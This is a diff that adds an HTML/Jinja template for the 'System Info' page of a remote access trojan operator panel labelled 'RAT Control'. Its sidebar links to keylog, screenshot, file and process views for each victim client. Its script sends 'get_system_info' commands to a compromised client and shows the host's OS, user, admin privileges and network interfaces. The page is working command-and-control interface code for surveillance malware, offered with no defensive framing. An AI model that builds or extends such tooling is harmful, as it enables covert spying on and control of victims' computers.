@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Info - {{ client_id[:16] }}...</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='dashboard.css') }}">
+    <style>
+        .info-section {
+            background: #1a1a2e;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .info-section h2 {
+            color: #00d9ff;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #2a2a3e;
+        }
+        
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 15px;
+        }
+        
+        .info-item {
+            background: #252540;
+            padding: 15px;
+            border-radius: 8px;
+        }
+        
+        .info-label {
+            color: #a0a0b0;
+            font-size: 0.9em;
+            margin-bottom: 5px;
+        }
+        
+        .info-value {
+            color: #fff;
+            font-weight: 600;
+            font-size: 1.1em;
+        }
+        
+        .network-card {
+            background: #252540;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+        
+        .tab-buttons {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .tab-btn {
+            padding: 10px 20px;
+            background: #252540;
+            border: none;
+            border-radius: 8px;
+            color: #a0a0b0;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .tab-btn.active {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="sidebar">
+        <div class="logo">
+            <h2>🎯 RAT Control</h2>
+        </div>
+        <nav class="nav-menu">
+            <a href="/admin/dashboard" class="nav-item">
+                <span class="icon">🏠</span>
+                <span>Dashboard</span>
+            </a>
+            <a href="/admin/processes/{{ client_id }}" class="nav-item">
+                <span class="icon">⚙️</span>
+                <span>Processes</span>
+            </a>
+            <a href="/admin/files/{{ client_id }}" class="nav-item">
+                <span class="icon">📁</span>
+                <span>Files</span>
+            </a>
+            <a href="/admin/keylogs/{{ client_id }}" class="nav-item">
+                <span class="icon">⌨️</span>
+                <span>Keylogs</span>
+            </a>
+            <a href="/admin/screenshot/{{ client_id }}" class="nav-item">
+                <span class="icon">📸</span>
+                <span>Screenshot</span>
+            </a>
+            <a href="/admin/system/{{ client_id }}" class="nav-item active">
+                <span class="icon">ℹ️</span>
+                <span>System Info</span>
+            </a>
+        </nav>
+    </div>
+
+    <div class="main-content">
+        <header>
+            <h1>ℹ️ System Information</h1>
+            <div class="header-actions">
+                <button class="btn btn-primary" onclick="loadSystemInfo()">🔄 Refresh</button>
+                <a href="/admin/dashboard" class="btn btn-primary">⬅️ Back</a>
+            </div>
+        </header>
+
+        <div class="client-info" style="background: #1a1a2e; padding: 15px; border-radius: 10px; margin-bottom: 20px;">
+            <strong>Client:</strong> {{ hostname }} ({{ username }}) - <span class="status-{{ 'online' if is_online else 'offline' }}">{{ '🟢 Online' if is_online else '🔴 Offline' }}</span>
+        </div>
+
+        <div class="tab-buttons">
+            <button class="tab-btn active" onclick="showTab('os')">💻 OS Info</button>
+            <button class="tab-btn" onclick="showTab('architecture')">🏗️ Architecture</button>
+            <button class="tab-btn" onclick="showTab('user')">👤 User Info</button>
+            <button class="tab-btn" onclick="showTab('privileges')">🔐 Privileges</button>
+            <button class="tab-btn" onclick="showTab('network')">🌐 Network</button>
+        </div>
+
+        <div id="systemInfoContent">
+            <div class="loading">Loading system information...</div>
+        </div>
+    </div>
+
+    <script src="{{ url_for('static', filename='main.js') }}"></script>
+    <script>
+        const clientId = '{{ client_id }}';
+        let systemData = {};
+        let currentTab = 'os';
+
+        async function loadSystemInfo() {
+            try {
+                document.getElementById('systemInfoContent').innerHTML = '<div class="loading">Loading system information...</div>';
+                
+                const types = ['os_info', 'architecture_info', 'user_info', 'privileges_info', 'network_info'];
+                const results = {};
+                
+                for (const type of types) {
+                    const cmdResponse = await fetch(`/admin/process/${clientId}`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            action: 'get_system_info',
+                            data: {info_type: type}
+                        })
+                    });
+                    
+                    const cmdData = await cmdResponse.json();
+                    if (cmdData.success) {
+                        await new Promise(resolve => setTimeout(resolve, 1500));
+                        
+                        const resultResponse = await fetch(`/admin/command_result/${cmdData.command_id}`);
+                        const resultData = await resultResponse.json();
+                        
+                        if (resultData.success) {
+                            results[type] = resultData.result;
+                        }
+                    }
+                }
+                
+                systemData = results;
+                displaySystemInfo();
+            } catch (error) {
+                showNotification('Error loading system info: ' + error.message, 'error');
+            }
+        }
+
+        function displaySystemInfo() {
+            const content = document.getElementById('systemInfoContent');
+            
+            content.innerHTML = `
+                <div class="tab-content active" id="tab-os">${renderOSInfo()}</div>
+                <div class="tab-content" id="tab-architecture">${renderArchInfo()}</div>
+                <div class="tab-content" id="tab-user">${renderUserInfo()}</div>
+                <div class="tab-content" id="tab-privileges">${renderPrivilegesInfo()}</div>
+                <div class="tab-content" id="tab-network">${renderNetworkInfo()}</div>
+            `;
+        }
+
+        function renderOSInfo() {
+            const data = systemData.os_info || {};
+            return `
+                <div class="info-section">
+                    <h2>💻 Operating System</h2>
+                    <div class="info-grid">
+                        <div class="info-item">
+                            <div class="info-label">Platform</div>
+                            <div class="info-value">${data.platform || 'N/A'}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">System</div>
+                            <div class="info-value">${data.system || 'N/A'}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">Release</div>
+                            <div class="info-value">${data.release || 'N/A'}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">Version</div>
+                            <div class="info-value">${data.version || 'N/A'}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">Hostname</div>
+                            <div class="info-value">${data.hostname || 'N/A'}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">Boot Time</div>
+                            <div class="info-value">${data.boot_time || 'N/A'}</div>
+                        </div>
+                    </div>
+                </div>
+            `;
+        }
+
+        function renderArchInfo() {
+            const data = systemData.architecture_info || {};
+            return `
+                <div class="info-section">
+                    <h2>🏗️ Architecture</h2>
+                    <div class="info-grid">
+                        <div class="info-item">
+                            <div class="info-label">Architecture</div>
+                            <div class="info-value">${data.architecture || 'N/A'}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">Machine</div>
+                            <div class="info-value">${data.machine || 'N/A'}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">Processor</div>
+                            <div class="info-value">${data.processor || 'N/A'}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">CPU Count</div>
+                            <div class="info-value">${data.cpu_count || 'N/A'}</div>
+                        </div>
+                    </div>
+                </div>
+            `;
+        }
+
+        function renderUserInfo() {
+            const data = systemData.user_info || {};
+            return `
+                <div class="info-section">
+                    <h2>👤 User Information</h2>
+                    <div class="info-grid">
+                        <div class="info-item">
+                            <div class="info-label">Username</div>
+                            <div class="info-value">${data.username || 'N/A'}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">Home Directory</div>
+                            <div class="info-value">${data.home_dir || 'N/A'}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">User ID</div>
+                            <div class="info-value">${data.user_id || 'N/A'}</div>
+                        </div>
+                    </div>
+                </div>
+            `;
+        }
+
+        function renderPrivilegesInfo() {
+            const data = systemData.privileges_info || {};
+            return `
+                <div class="info-section">
+                    <h2>🔐 Privileges</h2>
+                    <div class="info-grid">
+                        <div class="info-item">
+                            <div class="info-label">Is Admin</div>
+                            <div class="info-value">${data.is_admin ? '✅ Yes' : '❌ No'}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">Effective UID</div>
+                            <div class="info-value">${data.effective_uid || 'N/A'}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">Effective GID</div>
+                            <div class="info-value">${data.effective_gid || 'N/A'}</div>
+                        </div>
+                    </div>
+                </div>
+            `;
+        }
+
+        function renderNetworkInfo() {
+            const data = systemData.network_info || {};
+            let html = '<div class="info-section"><h2>🌐 Network Information</h2>';
+            
+            if (data.interfaces) {
+                Object.keys(data.interfaces).forEach(iface => {
+                    const info = data.interfaces[iface];
+                    html += `
+                        <div class="network-card">
+                            <h3 style="color: #00d9ff; margin-bottom: 10px;">${iface}</h3>
+                            <div class="info-grid">
+                                ${info.ipv4 ? `<div class="info-item"><div class="info-label">IPv4</div><div class="info-value">${info.ipv4}</div></div>` : ''}
+                                ${info.ipv6 ? `<div class="info-item"><div class="info-label">IPv6</div><div class="info-value">${info.ipv6}</div></div>` : ''}
+                                ${info.mac ? `<div class="info-item"><div class="info-label">MAC</div><div class="info-value">${info.mac}</div></div>` : ''}
+                            </div>
+                        </div>
+                    `;
+                });
+            }
+            
+            html += '</div>';
+            return html;
+        }
+
+        function showTab(tabName) {
+            // Update buttons
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            event.target.classList.add('active');
+            
+            // Update content
+            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+            document.getElementById(`tab-${tabName}`).classList.add('active');
+            
+            currentTab = tabName;
+        }
+
+        window.addEventListener('load', () => loadSystemInfo());
+    </script>
+</body>
+</html>
